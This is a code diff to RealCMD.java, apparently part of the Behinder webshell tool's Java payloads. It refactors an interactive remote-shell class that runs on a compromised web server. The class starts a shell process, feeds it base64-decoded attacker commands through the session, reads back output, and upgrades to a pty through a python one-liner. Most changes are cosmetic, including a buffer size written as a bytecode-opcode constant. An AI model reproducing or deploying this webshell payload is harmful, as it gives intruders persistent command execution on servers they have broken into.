@@ -1,5 +1,7 @@
 package net.rebeyond.behinder.payload.java;
 
+import org.objectweb.asm.Opcodes;
+import sun.misc.BASE64Decoder;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -12,7 +14,6 @@ import java.io.*;
 import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
-import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -61,26 +62,26 @@ public class RealCMD implements Runnable {
 
     public String runCmd(PageContext page) throws Exception {
         page.getResponse().setCharacterEncoding("UTF-8");
-        String result = "";
         if (type.equals("create")) {
-            this.Session.setAttribute("working", Boolean.valueOf(true));
+            this.Session.setAttribute("working", true);
             new Thread(new RealCMD(this.Session)).start();
-            return result;
+            return "";
         } else if (type.equals("read")) {
             return ((StringBuilder) this.Session.getAttribute("output")).toString();
         } else {
             if (type.equals("write")) {
                 ((StringBuilder) this.Session.getAttribute("output")).setLength(0);
+                String input = new String(new BASE64Decoder().decodeBuffer(cmd));
                 BufferedWriter writer = (BufferedWriter) this.Session.getAttribute("writer");
-                writer.write(new String(Base64.getDecoder().decode(cmd)));
+                writer.write(input);
                 writer.flush();
                 Thread.sleep(100);
-                return result;
+                return "";
             } else if (!type.equals("stop")) {
-                return result;
+                return "";
             } else {
                 ((Process) this.Session.getAttribute("process")).destroy();
-                return result;
+                return "";
             }
         }
     }
@@ -116,7 +117,7 @@ public class RealCMD implements Runnable {
                 writer.write(String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath) + "\n");
                 writer.flush();
             }
-            byte[] buffer = new byte[1024];
+            byte[] buffer = new byte[Opcodes.ACC_ABSTRACT];
             while (true) {
                 int length = stdout.read(buffer);
                 if (length > -1) {
@@ -143,11 +144,11 @@ public class RealCMD implements Runnable {
                     getClass();
                     Class Base64 = Class.forName("java.util.Base64");
                     Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
-                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
+                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
                     getClass();
                     Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
+                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                 }
             }
             sb.append(value);
